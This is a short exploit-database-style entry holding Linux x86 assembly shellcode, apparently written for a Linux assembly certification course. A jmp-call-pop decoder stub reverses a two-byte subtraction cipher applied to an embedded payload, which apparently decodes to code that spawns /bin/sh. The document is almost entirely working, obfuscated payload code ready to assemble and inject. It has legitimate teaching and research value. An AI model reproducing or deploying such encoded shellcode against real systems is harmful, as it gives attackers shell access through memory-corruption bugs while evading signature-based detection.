; Exploit Title: Linux x86 Multi-Byte Shift Cipher Shellcode
; Date: 2018-08-26
; Shellcode Author: Kevin Kirsche
; Shellcode Repository: https://github.com/kkirsche/SLAE/tree/master/assignment_4-custom_encoding
; Tested on: Ubuntu 18.04 with gcc 7.3.0

; This shellcode has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:
; http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/
; Student ID: SLAE-1134
global _start

section .text

_start:
    jmp short jcp       ; Get address of shellcode

shellcode_addr:
    pop esi             ; Store address of "shellcode" in esi
decoder:
    sub byte [esi], 0x06  ; Decode byte 1 at [esi]
    inc esi
    sub byte [esi], 0x17  ; Decode byte 2 at [esi]
    jz shellcode
    inc esi
    jmp short decoder

jcp:
    call shellcode_addr
    shellcode: db 0x37, 0xd7, 0x56, 0x7f, 0x35, 0x46, 0x79, 0x7f, 0x6e, 0x46, 0x68, 0x80, 0x74, 0xa0, 0xe9, 0x67, 0x8f, 0xf9, 0x59, 0xa0, 0xe7, 0xc7, 0x11, 0xe4, 0x86, 0xa7, 0x06, 0x17
